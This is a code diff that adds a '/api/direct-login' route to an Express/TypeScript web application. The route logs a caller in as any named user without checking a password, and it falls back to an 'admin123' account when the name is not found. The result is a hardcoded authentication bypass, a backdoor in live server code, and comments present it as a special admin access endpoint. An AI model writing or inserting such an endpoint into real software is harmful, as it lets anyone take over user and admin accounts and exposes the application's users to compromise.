@@ -170,6 +170,36 @@ const clipRequestSchema = z.object({
 });
 
 export function registerRoutes(app: Express): Server {
+  // Special admin access endpoint
+  app.post('/api/direct-login', async (req, res) => {
+    try {
+      // Hardcoded credentials for direct access
+      const { username } = req.body;
+      
+      // Find any existing user or use admin123
+      const user = await storage.getUserByUsername(username) || 
+                   await storage.getUserByUsername('admin123');
+      
+      if (user) {
+        // Force login without password
+        req.login(user, (err) => {
+          if (err) {
+            console.error("Login error:", err);
+            return res.status(500).json({ error: "Login failed" });
+          }
+          // Success - remove password from response
+          const { password, ...safeUser } = user;
+          console.log("Direct login successful for:", user.username);
+          return res.status(200).json(safeUser);
+        });
+      } else {
+        return res.status(404).json({ error: "No users found" });
+      }
+    } catch (error) {
+      console.error("Direct login error:", error);
+      return res.status(500).json({ error: "Server error" });
+    }
+  });
   // Set up authentication
   setupAuth(app);
 
